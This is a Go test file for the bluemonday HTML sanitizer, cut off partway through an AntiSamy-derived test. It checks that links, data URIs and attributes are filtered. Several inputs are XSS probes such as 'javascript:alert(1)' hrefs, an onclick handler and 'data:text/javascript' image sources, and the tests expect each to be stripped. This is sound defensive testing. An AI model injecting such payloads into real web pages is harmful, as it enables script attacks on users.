// Copyright (c) 2014, David Kitchen <david@buro9.com>
//
// All rights reserved.
//
// Redistribution and use in source and binary forms, with or without
// modification, are permitted provided that the following conditions are met:
//
// * Redistributions of source code must retain the above copyright notice, this
//   list of conditions and the following disclaimer.
//
// * Redistributions in binary form must reproduce the above copyright notice,
//   this list of conditions and the following disclaimer in the documentation
//   and/or other materials provided with the distribution.
//
// * Neither the name of the organisation (Microcosm) nor the names of its
//   contributors may be used to endorse or promote products derived from
//   this software without specific prior written permission.
//
// THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
// AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
// IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
// DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
// FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
// DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
// SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
// CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
// OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
// OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

package bluemonday

import (
	"encoding/base64"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"testing"
)

// test is a simple input vs output struct used to construct a slice of many
// tests to run within a single test method.
type test struct {
	in       string
	expected string
}

func TestEmpty(t *testing.T) {
	p := StrictPolicy()

	if "" != p.Sanitize(``) {
		t.Error("Empty string is not empty")
	}
}

func TestSignatureBehaviour(t *testing.T) {
	// https://github.com/microcosm-cc/bluemonday/issues/8
	p := UGCPolicy()

	input := "Hi.\n"

	if output := p.Sanitize(input); output != input {
		t.Errorf(`Sanitize() input = %s, output = %s`, input, output)
	}

	if output := string(p.SanitizeBytes([]byte(input))); output != input {
		t.Errorf(`SanitizeBytes() input = %s, output = %s`, input, output)
	}

	if output := p.SanitizeReader(
		strings.NewReader(input),
	).String(); output != input {

		t.Errorf(`SanitizeReader() input = %s, output = %s`, input, output)
	}

	input = "\t\n \n\t"

	if output := p.Sanitize(input); output != input {
		t.Errorf(`Sanitize() input = %s, output = %s`, input, output)
	}

	if output := string(p.SanitizeBytes([]byte(input))); output != input {
		t.Errorf(`SanitizeBytes() input = %s, output = %s`, input, output)
	}

	if output := p.SanitizeReader(
		strings.NewReader(input),
	).String(); output != input {

		t.Errorf(`SanitizeReader() input = %s, output = %s`, input, output)
	}
}

func TestAllowDocType(t *testing.T) {
	p := NewPolicy()
	p.AllowElements("b")

	in := "<!DOCTYPE html>Hello, <b>World</b>!"
	expected := "Hello, <b>World</b>!"

	out := p.Sanitize(in)
	if out != expected {
		t.Errorf(
			"test 1 failed;\ninput   : %s\noutput  : %s\nexpected: %s",
			in,
			out,
			expected,
		)
	}

	// Allow the doctype and run the test again
	p.AllowDocType(true)

	expected = "<!DOCTYPE html>Hello, <b>World</b>!"

	out = p.Sanitize(in)
	if out != expected {
		t.Errorf(
			"test 1 failed;\ninput   : %s\noutput  : %s\nexpected: %s",
			in,
			out,
			expected,
		)
	}
}

func TestLinks(t *testing.T) {

	tests := []test{
		{
			in:       `<a href="http://www.google.com">`,
			expected: `<a href="http://www.google.com" rel="nofollow">`,
		},
		{
			in:       `<a href="//www.google.com">`,
			expected: `<a href="//www.google.com" rel="nofollow">`,
		},
		{
			in:       `<a href="/www.google.com">`,
			expected: `<a href="/www.google.com" rel="nofollow">`,
		},
		{
			in:       `<a href="www.google.com">`,
			expected: `<a href="www.google.com" rel="nofollow">`,
		},
		{
			in:       `<a href="javascript:alert(1)">`,
			expected: ``,
		},
		{
			in:       `<a href="#">`,
			expected: ``,
		},
		{
			in:       `<a href="#top">`,
			expected: `<a href="#top" rel="nofollow">`,
		},
		{
			in:       `<a href="?q=1">`,
			expected: `<a href="?q=1" rel="nofollow">`,
		},
		{
			in:       `<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUAAAAFCAYAAACNbyblAAAAHElEQVQI12P4//8/w38GIAXDIBKE0DHxgljNBAAO9TXL0Y4OHwAAAABJRU5ErkJggg==" alt="Red dot" />`,
			expected: `<img alt="Red dot"/>`,
		},
		{
			in:       `<img src="giraffe.gif" />`,
			expected: `<img src="giraffe.gif"/>`,
		},
	}

	p := UGCPolicy()
	p.RequireParseableURLs(true)

	// These tests are run concurrently to enable the race detector to pick up
	// potential issues
	wg := sync.WaitGroup{}
	wg.Add(len(tests))
	for ii, tt := range tests {
		go func(ii int, tt test) {
			out := p.Sanitize(tt.in)
			if out != tt.expected {
				t.Errorf(
					"test %d failed;\ninput   : %s\noutput  : %s\nexpected: %s",
					ii,
					tt.in,
					out,
					tt.expected,
				)
			}
			wg.Done()
		}(ii, tt)
	}
	wg.Wait()
}

func TestLinkTargets(t *testing.T) {

	tests := []test{
		{
			in:       `<a href="http://www.google.com">`,
			expected: `<a href="http://www.google.com" rel="nofollow noopener" target="_blank">`,
		},
		{
			in:       `<a href="//www.google.com">`,
			expected: `<a href="//www.google.com" rel="nofollow noopener" target="_blank">`,
		},
		{
			in:       `<a href="/www.google.com">`,
			expected: `<a href="/www.google.com">`,
		},
		{
			in:       `<a href="www.google.com">`,
			expected: `<a href="www.google.com">`,
		},
		{
			in:       `<a href="javascript:alert(1)">`,
			expected: ``,
		},
		{
			in:       `<a href="#">`,
			expected: ``,
		},
		{
			in:       `<a href="#top">`,
			expected: `<a href="#top">`,
		},
		{
			in:       `<a href="?q=1">`,
			expected: `<a href="?q=1">`,
		},
		{
			in:       `<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUAAAAFCAYAAACNbyblAAAAHElEQVQI12P4//8/w38GIAXDIBKE0DHxgljNBAAO9TXL0Y4OHwAAAABJRU5ErkJggg==" alt="Red dot" />`,
			expected: `<img alt="Red dot"/>`,
		},
		{
			in:       `<img src="giraffe.gif" />`,
			expected: `<img src="giraffe.gif"/>`,
		},
	}

	p := UGCPolicy()
	p.RequireParseableURLs(true)
	p.RequireNoFollowOnLinks(false)
	p.RequireNoFollowOnFullyQualifiedLinks(true)
	p.AddTargetBlankToFullyQualifiedLinks(true)

	// These tests are run concurrently to enable the race detector to pick up
	// potential issues
	wg := sync.WaitGroup{}
	wg.Add(len(tests))
	for ii, tt := range tests {
		go func(ii int, tt test) {
			out := p.Sanitize(tt.in)
			if out != tt.expected {
				t.Errorf(
					"test %d failed;\ninput   : %s\noutput  : %s\nexpected: %s",
					ii,
					tt.in,
					out,
					tt.expected,
				)
			}
			wg.Done()
		}(ii, tt)
	}
	wg.Wait()
}

func TestStyling(t *testing.T) {

	tests := []test{
		{
			in:       `<span class="foo">Hello World</span>`,
			expected: `<span class="foo">Hello World</span>`,
		},
		{
			in:       `<span class="foo bar654">Hello World</span>`,
			expected: `<span class="foo bar654">Hello World</span>`,
		},
	}

	p := UGCPolicy()
	p.AllowStyling()

	// These tests are run concurrently to enable the race detector to pick up
	// potential issues
	wg := sync.WaitGroup{}
	wg.Add(len(tests))
	for ii, tt := range tests {
		go func(ii int, tt test) {
			out := p.Sanitize(tt.in)
			if out != tt.expected {
				t.Errorf(
					"test %d failed;\ninput   : %s\noutput  : %s\nexpected: %s",
					ii,
					tt.in,
					out,
					tt.expected,
				)
			}
			wg.Done()
		}(ii, tt)
	}
	wg.Wait()
}

func TestEmptyAttributes(t *testing.T) {

	p := UGCPolicy()
	// Do not do this, especially without a Matching() clause, this is a test
	p.AllowAttrs("disabled").OnElements("textarea")

	tests := []test{
		// Empty elements
		{
			in: `<textarea>text</textarea><textarea disabled></textarea>` +
				`<div onclick='redirect()'><span>Styled by span</span></div>`,
			expected: `<textarea>text</textarea><textarea disabled=""></textarea>` +
				`<div><span>Styled by span</span></div>`,
		},
		{
			in:       `foo<br />bar`,
			expected: `foo<br/>bar`,
		},
		{
			in:       `foo<br/>bar`,
			expected: `foo<br/>bar`,
		},
		{
			in:       `foo<br>bar`,
			expected: `foo<br>bar`,
		},
		{
			in:       `foo<hr noshade>bar`,
			expected: `foo<hr>bar`,
		},
	}

	for ii, test := range tests {
		out := p.Sanitize(test.in)
		if out != test.expected {
			t.Errorf(
				"test %d failed;\ninput   : %s\noutput  : %s\nexpected: %s",
				ii,
				test.in,
				out,
				test.expected,
			)
		}
	}
}

func TestDataUri(t *testing.T) {

	p := UGCPolicy()
	p.AllowURLSchemeWithCustomPolicy(
		"data",
		func(url *url.URL) (allowUrl bool) {
			// Allows PNG images only
			const prefix = "image/png;base64,"
			if !strings.HasPrefix(url.Opaque, prefix) {
				return false
			}
			if _, err := base64.StdEncoding.DecodeString(url.Opaque[len(prefix):]); err != nil {
				return false
			}
			if url.RawQuery != "" || url.Fragment != "" {
				return false
			}
			return true
		},
	)

	tests := []test{
		{
			in:       `<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUAAAAFCAYAAACNbyblAAAAHElEQVQI12P4//8/w38GIAXDIBKE0DHxgljNBAAO9TXL0Y4OHwAAAABJRU5ErkJggg==">`,
			expected: `<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUAAAAFCAYAAACNbyblAAAAHElEQVQI12P4//8/w38GIAXDIBKE0DHxgljNBAAO9TXL0Y4OHwAAAABJRU5ErkJggg==">`,
		},
		{
			in:       `<img src="data:text/javascript;charset=utf-8,alert('hi');">`,
			expected: ``,
		},
		{
			in:       `<img src="data:image/png;base64,charset=utf-8,alert('hi');">`,
			expected: ``,
		},
		{
			in:       `<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUAAAAFCAYAAACNbyblAAAAHElEQVQI12P4-_8/w38GIAXDIBKE0DHxgljNBAAO9TXL0Y4OHwAAAABJRU5ErkJggg==">`,
			expected: ``,
		},
	}

	for ii, test := range tests {
		out := p.Sanitize(test.in)
		if out != test.expected {
			t.Errorf(
				"test %d failed;\ninput   : %s\noutput  : %s\nexpected: %s",
				ii,
				test.in,
				out,
				test.expected,
			)
		}
	}
}

func TestAntiSamy(t *testing.T) {

	standardUrls := regexp.MustCompile(`(?i)^https?|mailto`)

	p := NewPolicy()

	p.AllowElements(
		"a", "b", "br", "div", "font", "i", "img", "input", "li", "ol", "p",
		"span", "td", "ul",
	)
	p.AllowAttrs("checked", "type").OnElements("input")
	p.AllowAttrs("color").OnElements("font")
	p.AllowAttrs("href").Matching(standardUrls).OnElements("a")
	p.AllowAttrs("src").Matching(standardUrls).OnElements("img")
	p.AllowAttrs("class", "id", "title").Globally()
	p.AllowAttrs("char").Matching(
		regexp.MustCompile(`p{L}`), // Single character or HTML entity only
	).OnElements("td")

	tests := []test{
		// Base64 strings
		//
		// first string is
		// <a - href="http://www.owasp.org">click here</a>
		{
			in:       `PGEgLSBocmVmPSJodHRwOi8vd3d3Lm93YXNwLm9yZyI+Y2xpY2sgaGVyZTwvYT4=`,
			expected: `PGEgLSBocmVmPSJodHRwOi8vd3d3Lm93YXNwLm9yZyI+Y2xpY2sgaGVyZTwvYT4=`,
		},
		// the rest are randomly generated 300 byte sequences which generate
		// parser errors, turned into Strings
		{
			in:       `uz0sEy5aDiok6oufQRaYPyYOxbtlACRnfrOnUVIbOstiaoB95iw+dJYuO5sI9nudhRtSYLANlcdgO0pRb+65qKDwZ5o6GJRMWv4YajZk+7Q3W/GN295XmyWUpxuyPGVi7d5fhmtYaYNW6vxyKK1Wjn9IEhIrfvNNjtEF90vlERnz3wde4WMaKMeciqgDXuZHEApYmUcu6Wbx4Q6WcNDqohAN/qCli74tvC+Umy0ZsQGU7E+BvJJ1tLfMcSzYiz7Q15ByZOYrA2aa0wDu0no3gSatjGt6aB4h30D9xUP31LuPGZ2GdWwMfZbFcfRgDSh42JPwa1bODmt5cw0Y8ACeyrIbfk9IkX1bPpYfIgtO7TwuXjBbhh2EEixOZ2YkcsvmcOSVTvraChbxv6kP`,
			expected: `uz0sEy5aDiok6oufQRaYPyYOxbtlACRnfrOnUVIbOstiaoB95iw+dJYuO5sI9nudhRtSYLANlcdgO0pRb+65qKDwZ5o6GJRMWv4YajZk+7Q3W/GN295XmyWUpxuyPGVi7d5fhmtYaYNW6vxyKK1Wjn9IEhIrfvNNjtEF90vlERnz3wde4WMaKMeciqgDXuZHEApYmUcu6Wbx4Q6WcNDqohAN/qCli74tvC+Umy0ZsQGU7E+BvJJ1tLfMcSzYiz7Q15ByZOYrA2aa0wDu0no3gSatjGt6aB4h30D9xUP31LuPGZ2GdWwMfZbFcfRgDSh42JPwa1bODmt5cw0Y8ACeyrIbfk9IkX1bPpYfIgtO7TwuXjBbhh2EEixOZ2YkcsvmcOSVTvraChbxv6kP`,
		},
		{
			in:       `PIWjMV4y+MpuNLtcY3vBRG4ZcNaCkB9wXJr3pghmFA6rVXAik+d5lei48TtnHvfvb5rQZVceWKv9cR/9IIsLokMyN0omkd8j3TV0DOh3JyBjPHFCu1Gp4Weo96h5C6RBoB0xsE4QdS2Y1sq/yiha9IebyHThAfnGU8AMC4AvZ7DDBccD2leZy2Q617ekz5grvxEG6tEcZ3fCbJn4leQVVo9MNoerim8KFHGloT+LxdgQR6YN5y1ii3bVGreM51S4TeANujdqJXp8B7B1Gk3PKCRS2T1SNFZedut45y+/w7wp5AUQCBUpIPUj6RLp+y3byWhcbZbJ70KOzTSZuYYIKLLo8047Fej43bIaghJm0F9yIKk3C5gtBcw8T5pciJoVXrTdBAK/8fMVo29P`,
			expected: `PIWjMV4y+MpuNLtcY3vBRG4ZcNaCkB9wXJr3pghmFA6rVXAik+d5lei48TtnHvfvb5rQZVceWKv9cR/9IIsLokMyN0omkd8j3TV0DOh3JyBjPHFCu1Gp4Weo96h5C6RBoB0xsE4QdS2Y1sq/yiha9IebyHThAfnGU8AMC4AvZ7DDBccD2leZy2Q617ekz5grvxEG6tEcZ3fCbJn4leQVVo9MNoerim8KFHGloT+LxdgQR6YN5y1ii3bVGreM51S4TeANujdqJXp8B7B1Gk3PKCRS2T1SNFZedut45y+/w7wp5AUQCBUpIPUj6RLp+y3byWhcbZbJ70KOzTSZuYYIKLLo8047Fej43bIaghJm0F9yIKk3C5gtBcw8T5pciJoVXrTdBAK/8fMVo29P`,
		},
		{
			in:       `uCk7HocubT6KzJw2eXpSUItZFGkr7U+D89mJw70rxdqXP2JaG04SNjx3dd84G4bz+UVPPhPO2gBAx2vHI0xhgJG9T4vffAYh2D1kenmr+8gIHt6WDNeD+HwJeAbJYhfVFMJsTuIGlYIw8+I+TARK0vqjACyRwMDAndhXnDrk4E5U3hyjqS14XX0kIDZYM6FGFPXe/s+ba2886Q8o1a7WosgqqAmt4u6R3IHOvVf5/PIeZrBJKrVptxjdjelP8Xwjq2ujWNtR3/HM1kjRlJi4xedvMRe4Rlxek0NDLC9hNd18RYi0EjzQ0bGSDDl0813yv6s6tcT6xHMzKvDcUcFRkX6BbxmoIcMsVeHM/ur6yRv834o/TT5IdiM9/wpkuICFOWIfM+Y8OWhiU6BK`,
			expected: `uCk7HocubT6KzJw2eXpSUItZFGkr7U+D89mJw70rxdqXP2JaG04SNjx3dd84G4bz+UVPPhPO2gBAx2vHI0xhgJG9T4vffAYh2D1kenmr+8gIHt6WDNeD+HwJeAbJYhfVFMJsTuIGlYIw8+I+TARK0vqjACyRwMDAndhXnDrk4E5U3hyjqS14XX0kIDZYM6FGFPXe/s+ba2886Q8o1a7WosgqqAmt4u6R3IHOvVf5/PIeZrBJKrVptxjdjelP8Xwjq2ujWNtR3/HM1kjRlJi4xedvMRe4Rlxek0NDLC9hNd18RYi0EjzQ0bGSDDl0813yv6s6tcT6xHMzKvDcUcFRkX6BbxmoIcMsVeHM/ur6yRv834o/TT5IdiM9/wpkuICFOWIfM+Y8OWhiU6BK`,
		},
		{
			in:       `Bb6Cqy6stJ0YhtPirRAQ8OXrPFKAeYHeuZXuC1qdHJRlweEzl4F2z/ZFG7hzr5NLZtzrRG3wm5TXl6Aua5G6v0WKcjJiS2V43WB8uY1BFK1d2y68c1gTRSF0u+VTThGjz+q/R6zE8HG8uchO+KPw64RehXDbPQ4uadiL+UwfZ4BzY1OHhvM5+2lVlibG+awtH6qzzx6zOWemTih932Lt9mMnm3FzEw7uGzPEYZ3aBV5xnbQ2a2N4UXIdm7RtIUiYFzHcLe5PZM/utJF8NdHKy0SPaKYkdXHli7g3tarzAabLZqLT4k7oemKYCn/eKRreZjqTB2E8Kc9Swf3jHDkmSvzOYE8wi1vQ3X7JtPcQ2O4muvpSa70NIE+XK1CgnnsL79Qzci1/1xgkBlNq`,
			expected: `Bb6Cqy6stJ0YhtPirRAQ8OXrPFKAeYHeuZXuC1qdHJRlweEzl4F2z/ZFG7hzr5NLZtzrRG3wm5TXl6Aua5G6v0WKcjJiS2V43WB8uY1BFK1d2y68c1gTRSF0u+VTThGjz+q/R6zE8HG8uchO+KPw64RehXDbPQ4uadiL+UwfZ4BzY1OHhvM5+2lVlibG+awtH6qzzx6zOWemTih932Lt9mMnm3FzEw7uGzPEYZ3aBV5xnbQ2a2N4UXIdm7RtIUiYFzHcLe5PZM/utJF8NdHKy0SPaKYkdXHli7g3tarzAabLZqLT4k7oemKYCn/eKRreZjqTB2E8Kc9Swf3jHDkmSvzOYE8wi1vQ3X7JtPcQ2O4muvpSa70NIE+XK1CgnnsL79Qzci1/1xgkBlNq`,
		},
		{
			in:       `FZNVr4nOICD1cNfAvQwZvZWi+P4I2Gubzrt+wK+7gLEY144BosgKeK7snwlA/vJjPAnkFW72APTBjY6kk4EOyoUef0MxRnZEU11vby5Ru19eixZBFB/SVXDJleLK0z3zXXE8U5Zl5RzLActHakG8Psvdt8TDscQc4MPZ1K7mXDhi7FQdpjRTwVxFyCFoybQ9WNJNGPsAkkm84NtFb4KjGpwVC70oq87tM2gYCrNgMhBfdBl0bnQHoNBCp76RKdpq1UAY01t1ipfgt7BoaAr0eTw1S32DezjfkAz04WyPTzkdBKd3b44rX9dXEbm6szAz0SjgztRPDJKSMELjq16W2Ua8d1AHq2Dz8JlsvGzi2jICUjpFsIfRmQ/STSvOT8VsaCFhwL1zDLbn5jCr`,
			expected: `FZNVr4nOICD1cNfAvQwZvZWi+P4I2Gubzrt+wK+7gLEY144BosgKeK7snwlA/vJjPAnkFW72APTBjY6kk4EOyoUef0MxRnZEU11vby5Ru19eixZBFB/SVXDJleLK0z3zXXE8U5Zl5RzLActHakG8Psvdt8TDscQc4MPZ1K7mXDhi7FQdpjRTwVxFyCFoybQ9WNJNGPsAkkm84NtFb4KjGpwVC70oq87tM2gYCrNgMhBfdBl0bnQHoNBCp76RKdpq1UAY01t1ipfgt7BoaAr0eTw1S32DezjfkAz04WyPTzkdBKd3b44rX9dXEbm6szAz0SjgztRPDJKSMELjq16W2Ua8d1AHq2Dz8JlsvGzi2jICUjpFsIfRmQ/STSvOT8VsaCFhwL1zDLbn5jCr`,
		},
		{
			in:       `RuiRkvYjH2FcCjNzFPT2PJWh7Q6vUbfMadMIEnw49GvzTmhk4OUFyjY13GL52JVyqdyFrnpgEOtXiTu88Cm+TiBI7JRh0jRs3VJRP3N+5GpyjKX7cJA46w8PrH3ovJo3PES7o8CSYKRa3eUs7BnFt7kUCvMqBBqIhTIKlnQd2JkMNnhhCcYdPygLx7E1Vg+H3KybcETsYWBeUVrhRl/RAyYJkn6LddjPuWkDdgIcnKhNvpQu4MMqF3YbzHgyTh7bdWjy1liZle7xR/uRbOrRIRKTxkUinQGEWyW3bbXOvPO71E7xyKywBanwg2FtvzOoRFRVF7V9mLzPSqdvbM7VMQoLFob2UgeNLbVHkWeQtEqQWIV5RMu3+knhoqGYxP/3Srszp0ELRQy/xyyD`,
			expected: `RuiRkvYjH2FcCjNzFPT2PJWh7Q6vUbfMadMIEnw49GvzTmhk4OUFyjY13GL52JVyqdyFrnpgEOtXiTu88Cm+TiBI7JRh0jRs3VJRP3N+5GpyjKX7cJA46w8PrH3ovJo3PES7o8CSYKRa3eUs7BnFt7kUCvMqBBqIhTIKlnQd2JkMNnhhCcYdPygLx7E1Vg+H3KybcETsYWBeUVrhRl/RAyYJkn6LddjPuWkDdgIcnKhNvpQu4MMqF3YbzHgyTh7bdWjy1liZle7xR/uRbOrRIRKTxkUinQGEWyW3bbXOvPO71E7xyKywBanwg2FtvzOoRFRVF7V9mLzPSqdvbM7VMQoLFob2UgeNLbVHkWeQtEqQWIV5RMu3+knhoqGYxP/3Srszp0ELRQy/xyyD`,
		},
		{
			in:       `mqBEVbNnL929CUA3sjkOmPB5dL0/a0spq8LgbIsJa22SfP580XduzUIKnCtdeC9TjPB/GEPp/LvEUFaLTUgPDQQGu3H5UCZyjVTAMHl45me/0qISEf903zFFqW5Lk3TS6iPrithqMMvhdK29Eg5OhhcoHS+ALpn0EjzUe86NywuFNb6ID4o8aF/ztZlKJegnpDAm3JuhCBauJ+0gcOB8GNdWd5a06qkokmwk1tgwWat7cQGFIH1NOvBwRMKhD51MJ7V28806a3zkOVwwhOiyyTXR+EcDA/aq5acX0yailLWB82g/2GR/DiaqNtusV+gpcMTNYemEv3c/xLkClJc29DSfTsJGKsmIDMqeBMM7RRBNinNAriY9iNX1UuHZLr/tUrRNrfuNT5CvvK1K`,
			expected: `mqBEVbNnL929CUA3sjkOmPB5dL0/a0spq8LgbIsJa22SfP580XduzUIKnCtdeC9TjPB/GEPp/LvEUFaLTUgPDQQGu3H5UCZyjVTAMHl45me/0qISEf903zFFqW5Lk3TS6iPrithqMMvhdK29Eg5OhhcoHS+ALpn0EjzUe86NywuFNb6ID4o8aF/ztZlKJegnpDAm3JuhCBauJ+0gcOB8GNdWd5a06qkokmwk1tgwWat7cQGFIH1NOvBwRMKhD51MJ7V28806a3zkOVwwhOiyyTXR+EcDA/aq5acX0yailLWB82g/2GR/DiaqNtusV+gpcMTNYemEv3c/xLkClJc29DSfTsJGKsmIDMqeBMM7RRBNinNAriY9iNX1UuHZLr/tUrRNrfuNT5CvvK1K`,
		},
		{
			in:       `IMcfbWZ/iCa/LDcvMlk6LEJ0gDe4ohy2Vi0pVBd9aqR5PnRj8zGit8G2rLuNUkDmQ95bMURasmaPw2Xjf6SQjRk8coIHDLtbg/YNQVMabE8pKd6EaFdsGWJkcFoonxhPR29aH0xvjC4Mp3cJX3mjqyVsOp9xdk6d0Y2hzV3W/oPCq0DV03pm7P3+jH2OzoVVIDYgG1FD12S03otJrCXuzDmE2LOQ0xwgBQ9sREBLXwQzUKfXH8ogZzjdR19pX9qe0rRKMNz8k5lqcF9R2z+XIS1QAfeV9xopXA0CeyrhtoOkXV2i8kBxyodDp7tIeOvbEfvaqZGJgaJyV8UMTDi7zjwNeVdyKa8USH7zrXSoCl+Ud5eflI9vxKS+u9Bt1ufBHJtULOCHGA2vimkU`,
			expected: `IMcfbWZ/iCa/LDcvMlk6LEJ0gDe4ohy2Vi0pVBd9aqR5PnRj8zGit8G2rLuNUkDmQ95bMURasmaPw2Xjf6SQjRk8coIHDLtbg/YNQVMabE8pKd6EaFdsGWJkcFoonxhPR29aH0xvjC4Mp3cJX3mjqyVsOp9xdk6d0Y2hzV3W/oPCq0DV03pm7P3+jH2OzoVVIDYgG1FD12S03otJrCXuzDmE2LOQ0xwgBQ9sREBLXwQzUKfXH8ogZzjdR19pX9qe0rRKMNz8k5lqcF9R2z+XIS1QAfeV9xopXA0CeyrhtoOkXV2i8kBxyodDp7tIeOvbEfvaqZGJgaJyV8UMTDi7zjwNeVdyKa8USH7zrXSoCl+Ud5eflI9vxKS+u9Bt1ufBHJtULOCHGA2vimkU`,
		},
		{
			in:       `AqC2sr44HVueGzgW13zHvJkqOEBWA8XA66ZEb3EoL1ehypSnJ07cFoWZlO8kf3k57L1fuHFWJ6quEdLXQaT9SJKHlUaYQvanvjbBlqWwaH3hODNsBGoK0DatpoQ+FxcSkdVE/ki3rbEUuJiZzU0BnDxH+Q6FiNsBaJuwau29w24MlD28ELJsjCcUVwtTQkaNtUxIlFKHLj0++T+IVrQH8KZlmVLvDefJ6llWbrFNVuh674HfKr/GEUatG6KI4gWNtGKKRYh76mMl5xH5qDfBZqxyRaKylJaDIYbx5xP5I4DDm4gOnxH+h/Pu6dq6FJ/U3eDio/KQ9xwFqTuyjH0BIRBsvWWgbTNURVBheq+am92YBhkj1QmdKTxQ9fQM55O8DpyWzRhky0NevM9j`,
			expected: `AqC2sr44HVueGzgW13zHvJkqOEBWA8XA66ZEb3EoL1ehypSnJ07cFoWZlO8kf3k57L1fuHFWJ6quEdLXQaT9SJKHlUaYQvanvjbBlqWwaH3hODNsBGoK0DatpoQ+FxcSkdVE/ki3rbEUuJiZzU0BnDxH+Q6FiNsBaJuwau29w24MlD28ELJsjCcUVwtTQkaNtUxIlFKHLj0++T+IVrQH8KZlmVLvDefJ6llWbrFNVuh674HfKr/GEUatG6KI4gWNtGKKRYh76mMl5xH5qDfBZqxyRaKylJaDIYbx5xP5I4DDm4gOnxH+h/Pu6dq6FJ/U3eDio/KQ9xwFqTuyjH0BIRBsvWWgbTNURVBheq+am92YBhkj1QmdKTxQ9fQM55O8DpyWzRhky0NevM9j`,
		},
		{
			in:       `qkFfS3WfLyj3QTQT9i/s57uOPQCTN1jrab8bwxaxyeYUlz2tEtYyKGGUufua8WzdBT2VvWTvH0JkK0LfUJ+vChvcnMFna+tEaCKCFMIOWMLYVZSJDcYMIqaIr8d0Bi2bpbVf5z4WNma0pbCKaXpkYgeg1Sb8HpKG0p0fAez7Q/QRASlvyM5vuIOH8/CM4fF5Ga6aWkTRG0lfxiyeZ2vi3q7uNmsZF490J79r/6tnPPXIIC4XGnijwho5NmhZG0XcQeyW5KnT7VmGACFdTHOb9oS5WxZZU29/oZ5Y23rBBoSDX/xZ1LNFiZk6Xfl4ih207jzogv+3nOro93JHQydNeKEwxOtbKqEe7WWJLDw/EzVdJTODrhBYKbjUce10XsavuiTvv+H1Qh4lo2Vx`,
			expected: `qkFfS3WfLyj3QTQT9i/s57uOPQCTN1jrab8bwxaxyeYUlz2tEtYyKGGUufua8WzdBT2VvWTvH0JkK0LfUJ+vChvcnMFna+tEaCKCFMIOWMLYVZSJDcYMIqaIr8d0Bi2bpbVf5z4WNma0pbCKaXpkYgeg1Sb8HpKG0p0fAez7Q/QRASlvyM5vuIOH8/CM4fF5Ga6aWkTRG0lfxiyeZ2vi3q7uNmsZF490J79r/6tnPPXIIC4XGnijwho5NmhZG0XcQeyW5KnT7VmGACFdTHOb9oS5WxZZU29/oZ5Y23rBBoSDX/xZ1LNFiZk6Xfl4ih207jzogv+3nOro93JHQydNeKEwxOtbKqEe7WWJLDw/EzVdJTODrhBYKbjUce10XsavuiTvv+H1Qh4lo2Vx`,
		},
		{
			in:       `O900/Gn82AjyLYqiWZ4ILXBBv/ZaXpTpQL0p9nv7gwF2MWsS2OWEImcVDa+1ElrjUumG6CVEv/rvax53krqJJDg+4Z/XcHxv58w6hNrXiWqFNjxlu5RZHvj1oQQXnS2n8qw8e/c+8ea2TiDIVr4OmgZz1G9uSPBeOZJvySqdgNPMpgfjZwkL2ez9/x31sLuQxi/FW3DFXU6kGSUjaq8g/iGXlaaAcQ0t9Gy+y005Z9wpr2JWWzishL+1JZp9D4SY/r3NHDphN4MNdLHMNBRPSIgfsaSqfLraIt+zWIycsd+nksVxtPv9wcyXy51E1qlHr6Uygz2VZYD9q9zyxEX4wRP2VEewHYUomL9d1F6gGG5fN3z82bQ4hI9uDirWhneWazUOQBRud5otPOm9`,
			expected: `O900/Gn82AjyLYqiWZ4ILXBBv/ZaXpTpQL0p9nv7gwF2MWsS2OWEImcVDa+1ElrjUumG6CVEv/rvax53krqJJDg+4Z/XcHxv58w6hNrXiWqFNjxlu5RZHvj1oQQXnS2n8qw8e/c+8ea2TiDIVr4OmgZz1G9uSPBeOZJvySqdgNPMpgfjZwkL2ez9/x31sLuQxi/FW3DFXU6kGSUjaq8g/iGXlaaAcQ0t9Gy+y005Z9wpr2JWWzishL+1JZp9D4SY/r3NHDphN4MNdLHMNBRPSIgfsaSqfLraIt+zWIycsd+nksVxtPv9wcyXy51E1qlHr6Uygz2VZYD9q9zyxEX4wRP2VEewHYUomL9d1F6gGG5fN3z82bQ4hI9uDirWhneWazUOQBRud5otPOm9`,
		},
		{
			in:       `C3c+d5Q9lyTafPLdelG1TKaLFinw1TOjyI6KkrQyHKkttfnO58WFvScl1TiRcB/iHxKahskoE2+VRLUIhctuDU4sUvQh/g9Arw0LAA4QTxuLFt01XYdigurz4FT15ox2oDGGGrRb3VGjDTXK1OWVJoLMW95EVqyMc9F+Fdej85LHE+8WesIfacjUQtTG1tzYVQTfubZq0+qxXws8QrxMLFtVE38tbeXo+Ok1/U5TUa6FjWflEfvKY3XVcl8RKkXua7fVz/Blj8Gh+dWe2cOxa0lpM75ZHyz9adQrB2Pb4571E4u2xI5un0R0MFJZBQuPDc1G5rPhyk+Hb4LRG3dS0m8IASQUOskv93z978L1+Abu9CLP6d6s5p+BzWxhMUqwQXC/CCpTywrkJ0RG`,
